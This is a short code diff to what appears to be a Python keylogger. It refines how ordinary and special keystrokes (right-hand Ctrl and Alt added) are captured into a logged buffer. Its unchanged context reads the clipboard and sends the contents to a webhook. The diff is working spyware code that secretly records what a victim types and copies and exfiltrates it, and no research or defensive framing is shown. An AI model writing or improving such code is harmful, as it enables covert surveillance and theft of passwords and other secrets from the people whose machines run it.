@@ -23,7 +23,9 @@ special_keys = {
     keyboard.Key.tab: " TAB ",
     keyboard.Key.shift: " SHIFT ",
     keyboard.Key.ctrl_l: " CTRL ",
+    keyboard.Key.ctrl_r: " CTRL ",
     keyboard.Key.alt_l: " ALT ",
+    keyboard.Key.alt_r: " ALT ",
     keyboard.Key.cmd: " CMD ",
     keyboard.Key.esc: " ESC ",
 }
@@ -92,9 +94,15 @@ def on_press(key):
             clipboard_content = pyperclip.paste()
             send_to_webhook(f"Clipboard content: {clipboard_content}")
             return False  # Don't propagate 'C' key to prevent logging
-        else:
-            # If it's a regular key, log it
-            key_str = key.char if hasattr(key, 'char') else str(key)
+        elif hasattr(key, 'char') and key.char is not None:
+            # Regular keypress (letters, numbers, etc.)
+            key_str = key.char
+            with lock:
+                keystrokes += key_str
+                last_keypress_time = time.time()
+        elif key in special_keys:
+            # Special key press
+            key_str = special_keys.get(key, f"[{key}]")
             with lock:
                 keystrokes += key_str
                 last_keypress_time = time.time()
